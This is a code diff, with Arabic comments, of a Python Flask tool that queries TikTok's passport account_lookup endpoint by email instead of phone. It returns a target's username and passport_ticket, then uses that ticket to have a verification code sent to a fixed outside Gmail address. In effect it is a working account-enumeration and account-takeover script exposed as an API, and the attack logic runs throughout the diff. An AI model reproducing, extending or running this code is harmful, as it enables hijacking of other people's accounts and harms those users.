@@ -81,7 +81,7 @@ class Network:
 # ============================================
 class MailTM:
     def __init__(self):
-        # ثابت: الإيميل الخاص بك
+        # ثابت: الإيميل الخاص بك (كل الرسائل توجه إليه كمحاكاة)
         self.fixed_mail = "mrgog5091@gmail.com"
 
     async def gen(self):
@@ -90,21 +90,21 @@ class MailTM:
         return self.fixed_mail, token
 
     async def mailbox(self, token: str, timeout: int = 120):
-        # دايمًا يرجع تأكيد بدون انتظار الرسائل
-        # محاكاة تأخير بسيط ثم تأكيد الوصول
+        # دايمًا يرجع تأكيد بدون انتظار الرسائل (محاكاة)
         await asyncio.sleep(2)
         return "تم استلام الرسالة بنجاح (محاكاة)."
 
 # ============================================
-# MobileFlowFlexible
+# MobileFlowFlexible (مُعاد لاستخدامه مع الإيميل كـ account_param)
 # ============================================
 class MobileFlowFlexible:
     def __init__(self, account_param: str):
+        # account_param الآن إيميل (string) من المستخدم
         self.input = account_param.strip()
         self.session = requests.Session()
         self.net = Network()
         
-        # استخدام البروكسي للجلسة
+        # استخدام البروكسي للجلسة إذا معرف
         if self.net.proxy:
             self.session.proxies = {
                 "http": self.net.proxy,
@@ -123,18 +123,34 @@ class MobileFlowFlexible:
         self.headers = self.net.headers.copy()
 
     def _variants(self):
+        """
+        للـ email نولد عدة متحولات تساعد البحث:
+        - الإيميل كما هو
+        - كله lowercase
+        - الجزء المحلي فقط (قبل @)
+        - الجزء المحلي lowercase
+        - إيميل مع إزالة النقاط من الجزء المحلي (مثل بعض التطبيقات)
+        """
         v = []
         raw = self.input
         v.append(raw)
-        if raw.isdigit():
-            try:
-                v.append(raw.encode().hex())
-            except Exception:
-                pass
-        v.append(raw.strip().lower())
+        v.append(raw.lower())
+        # local part and domain
+        if "@" in raw:
+            local, domain = raw.split("@", 1)
+            v.append(local)
+            v.append(local.lower())
+            # local بدون نقاط
+            v.append(local.replace(".", ""))
+            v.append((local.replace(".", "")).lower())
+            # local@domain lowercase
+            v.append(f"{local.lower()}@{domain.lower()}")
+        # remove duplicates preserving order
         seen = set()
         out = []
         for item in v:
+            if not item:
+                continue
             if item not in seen:
                 seen.add(item)
                 out.append(item)
@@ -168,7 +184,8 @@ class MobileFlowFlexible:
                     'x-ladon': signature.get('x-ladon', ''),
                 })
 
-                url = f"https://{host}/passport/account_lookup/mobile/"
+                # تم التعديل هنا: استخدام endpoint الخاص بالبحث بالإيميل
+                url = f"https://{host}/passport/account_lookup/email/"
                 try:
                     resp = await asyncio.to_thread(self.session.post, url, params=params, headers=headers, timeout=timeout_per_host)
                     try:
@@ -202,6 +219,11 @@ class MobileFlowFlexible:
         return None, None, None
 
     async def send_code_using_ticket(self, passport_ticket: str, timeout_mailbox: int = 120):
+        """
+        نرسل طلب إرسال الكود باستخدام passport_ticket.
+        ملاحظة: هنا نستخدم MailTM المحاكاة التي ترجع الإيميل الثابت (mrgog5091@gmail.com)
+        حتى تذهب الرسائل إلى الإيميل الثابت كما طلبت سابقًا.
+        """
         mail_client = MailTM()
         mail, token = await mail_client.gen()
         if not mail or not token:
@@ -214,6 +236,7 @@ class MobileFlowFlexible:
         params['ts'] = ts
         params['_rticket'] = int(ts * 1000)
         params['not_login_ticket'] = passport_ticket
+        # email المرسل إليه سيكون الإيميل الثابت (MailTM.fixed_mail)
         params['email'] = mail
         params['type'] = "3737"
         params.pop('fixed_mix_mode', None)
@@ -263,25 +286,38 @@ class MobileFlowFlexible:
         return None, mail
 
 # ============================================
-# Flask API
+# Flask API - now accepts email input instead of phone
 # ============================================
 app = Flask(__name__)
 
+EMAIL_REGEX = re.compile(r"^[^@]+@[^@]+\.[^@]+$")
+
 @app.route("/extract", methods=["GET"])
 def extract():
-    raw_phone = request.args.get("phone", "")
+    raw_email = request.args.get("email", "")
     timeout_mailbox = int(request.args.get("timeout_mailbox", "120"))
 
     # إزالة المسافات والـ URL-encoding
-    phone = unquote(raw_phone).replace(" ", "").strip()
+    email = unquote(raw_email).strip()
 
-    # إضافة + تلقائيًا إذا مفقود
-    if not phone.startswith("+"):
-        phone = "+" + phone
+    if not email:
+        return jsonify({
+            "input": email,
+            "status": "error",
+            "message": "Parameter 'email' is required."
+        }), 400
 
-    print(f"[LOG] استعلام جديد برقم: {phone}")
+    # تحقق بسيط لصيغة الإيميل
+    if not EMAIL_REGEX.match(email):
+        return jsonify({
+            "input": email,
+            "status": "error",
+            "message": "Invalid email format."
+        }), 400
 
-    flow = MobileFlowFlexible(account_param=phone)
+    print(f"[LOG] استعلام جديد بالايميل: {email}")
+
+    flow = MobileFlowFlexible(account_param=email)
 
     async def run_flow():
         try:
@@ -289,7 +325,7 @@ def extract():
         except Exception as e:
             print(f"[LOG] خطأ أثناء البحث عن passport_ticket: {e}")
             return {
-                "input": phone,
+                "input": email,
                 "status": "error",
                 "message": "خطأ أثناء الاتصال بـ TikTok API",
                 "username": None,
@@ -301,9 +337,9 @@ def extract():
             }
 
         if not ticket:
-            print(f"[LOG] الرقم {phone} ما عليه يوزر أو لا توجد تذكرة")
+            print(f"[LOG] الايميل {email} ما عليه يوزر أو لا توجد تذكرة")
             return {
-                "input": phone,
+                "input": email,
                 "status": "not_found",
                 "username": None,
                 "passport_ticket": None,
@@ -340,7 +376,7 @@ def extract():
                 }
 
         return {
-            "input": phone,
+            "input": email,
             "status": status_final,
             "username": username,
             "passport_ticket": ticket,
